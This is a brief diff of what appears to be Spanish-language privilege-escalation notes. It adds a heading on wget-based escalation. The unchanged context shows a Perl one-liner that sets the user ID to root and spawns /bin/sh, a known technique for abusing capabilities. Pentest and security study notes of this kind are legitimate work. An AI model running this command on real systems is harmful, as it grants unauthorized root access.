@@ -23,6 +23,7 @@
 	perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
 	
 ```
+### Escalada de privilegios con wget
 
 ### Capabilities
 
